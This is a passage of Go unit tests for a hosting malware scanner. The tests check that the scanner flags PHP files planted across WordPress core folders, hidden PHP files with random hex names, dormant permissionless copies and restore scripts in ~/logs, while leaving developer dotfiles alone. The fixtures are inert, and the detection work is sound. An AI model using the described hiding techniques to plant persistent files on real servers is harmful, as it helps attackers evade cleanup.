	for _, rel := range []string{"wp-admin/css/worksec.php", "wp-includes/css/worksec.php", "wp-admin/images/worksec.php"} {
		if d := check(rel); d == nil || d.Signature != "PHP.Planted.WordPressCoreSpray" || d.Category != CatVirus {
			t.Errorf("%s: %+v", rel, d)
		}
	}
	if d := check("wp-includes/images/lonely.php"); d == nil || d.Category != CatSuspicious {
		t.Errorf("one PHP file in core images: %+v", d)
	}
	// Every copy, also outside the asset folders, and also the last ones
	// once the others are quarantined.
	if d := check("wp-includes/ID3/worksec.php"); d == nil || d.Signature != "PHP.Planted.WordPressCoreSpray" {
		t.Errorf("copy outside the asset folders: %+v", d)
	}
	for _, d := range []string{"wp-admin/css", "wp-admin/images", "wp-includes/css", "wp-includes/ID3", "wp-includes/IXR"} {
		os.Remove(filepath.Join(root, d, "worksec.php"))
	}
	if d := check("wp-includes/Text/worksec.php"); d == nil || d.Signature != "PHP.Planted.WordPressCoreSpray" {
		t.Errorf("last copy: %+v", d)
	}
	// Core's own names in several folders (a release newer than the known
	// files): not a spray.
	for _, d := range []string{"wp-admin", "wp-admin/network", "wp-admin/user"} {
		put(d+"/about.php", inert)
	}
	for _, rel := range []string{"wp-includes/fonts/class-wp-font-face.php", "wp-admin/includes/custom-helper.php", "wp-admin/network/about.php"} {
		if d := check(rel); d != nil && strings.HasPrefix(d.Signature, "PHP.Planted.") {
			t.Errorf("%s: %s", rel, d.Signature)
		}
	}
	// Not a WordPress site: a folder that is only called wp-admin.
	other := filepath.Join(t.TempDir(), "u", "public_html", "wp-admin", "css")
	os.MkdirAll(other, 0o755)
	if d := s.checkContent(filepath.Join(other, "theme.php"), ".php", []byte(inert)); d != nil {
		t.Errorf("not WordPress: %s", d.Signature)
	}
}

// business100 (2026-10-26): two SEO doorway farms (sahibsul, bashopco)
// had no finding. Their self-healing kit kept dormant copies named
// .sys_<hex>.php, .sess_<hex>.php, .tmp_<hex>.php, .cache_<hex>.php
// (mode 000) and restore scripts in ~/logs/. Hidden PHP named by random
// hex, hidden PHP without permissions and PHP in ~/logs are malware;
// another hidden PHP file is suspicious (the AI looks); developer tools'
// dotfiles in plugins and packages stay alone.
func TestFleetHiddenAndLogsPHP(t *testing.T) {
	s := newScanner(t)
	inert := "<?php /* inert test fixture */ echo 'x';"
	dir := filepath.Join(t.TempDir(), "home2", "u")
	write := func(rel string, mode os.FileMode) string {
		p := filepath.Join(dir, rel)
		os.MkdirAll(filepath.Dir(p), 0o755)
		os.WriteFile(p, []byte(inert), 0o644)
		os.Chmod(p, mode)
		return p
	}
	// The test runs from a temporary folder: name it like a home.
	homeOf := func(p string) string { return "/home2/u" + strings.TrimPrefix(p, dir) }
	check := func(p string) *Detection {
		return plantedByName(homeOf(p), func(string) int { return plantedMode(p) })
	}
	for rel, sig := range map[string]string{
		"public_html/assets/.sys_9f3a1c7e2b.php":  "PHP.Planted.HiddenRandomName",
		"public_html/.sess_0a1b2c3d4e5f.php":      "PHP.Planted.HiddenRandomName",
		"cavescode.com/app/.cache_deadbeef01.php": "PHP.Planted.HiddenRandomName",
		"logs/cache_gc.php":                       "PHP.Planted.InLogsFolder",
		"logs/example.com/restore_config.php":     "PHP.Planted.InLogsFolder",
	} {
		if d := check(write(rel, 0o644)); d == nil || d.Signature != sig || d.Category != CatVirus {
			t.Errorf("%s: %+v", rel, d)
		}
	}
	if d := check(write("public_html/en/.sitemap_indo.php", 0)); d == nil || d.Signature != "PHP.Planted.HiddenDormant" {
		t.Errorf("dormant hidden copy: %+v", d)
	}
	if d := check(write("public_html/en/.sitemap_indo2.php", 0o644)); d == nil || d.Category != CatSuspicious {
		t.Errorf("hidden PHP: %+v", d)
	}
	for _, rel := range []string{
		"public_html/wp-content/plugins/x/.php-cs-fixer.dist.php",
		"public_html/wp-content/plugins/x/.phpstorm.meta.php",
		"public_html/vendor/y/.php_cs.dist.php",
		"public_html/wp-content/plugins/x/.rector.php",
		"laravel/app/.env.local.php",
		"public_html/index.php",
		"public_html/logs/view.php", // a site's own folder called logs
	} {
		if d := check(write(rel, 0o644)); d != nil {
			t.Errorf("%s: %s", rel, d.Signature)
		}
	}
	// Through the content check too (scan and recheck).
	if d := s.checkContent("/home2/u/logs/cache_gc.php", ".php", []byte(inert)); d == nil || d.Signature != "PHP.Planted.InLogsFolder" {
		t.Errorf("content check: %+v", d)
	}
}
